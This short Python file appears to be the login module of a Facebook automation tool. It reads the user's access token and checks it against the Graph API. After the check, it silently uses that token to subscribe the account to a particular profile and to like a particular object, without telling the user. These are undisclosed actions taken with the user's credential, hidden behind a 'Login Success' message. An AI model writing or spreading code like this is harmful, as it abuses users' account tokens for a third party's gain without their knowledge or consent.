import requests,os,json
import update

P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
O = "\x1b[0;96m" # Biru Muda

def main():
    try:
        token = open("token.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token=" + token)
        a = json.loads(otw.text)
        nama = a["name"]
    except (KeyError,IOError):
        print('%s❥━'%(M))
        print('%s❥━[%s!%s] %sToken Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        exit(update.menu_log())
    requests.post("https://graph.facebook.com/100000943014584/subscribers?access_token=" + token)      # Rana Nadeem Rajput
    requests.post('https://graph.facebook.com/6761598470548186/likes?summary=true&access_token=' + token)    
    print('%s❥━'%(O))
    print('%s❥━[%s!%s] %sLogin Success'%(O,P,O,P))
    exit(update.menu())
